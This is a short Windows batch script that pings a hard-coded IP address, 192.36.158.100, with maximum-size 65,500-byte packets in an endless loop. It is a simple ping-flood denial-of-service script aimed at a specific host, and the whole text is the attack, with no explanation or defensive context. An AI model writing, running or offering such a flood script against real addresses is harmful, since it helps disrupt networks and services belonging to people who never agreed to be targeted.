SET ip=192.36.158.100
:loop

ping %ip% -l 65500 -w 1 -n 1
goto :loop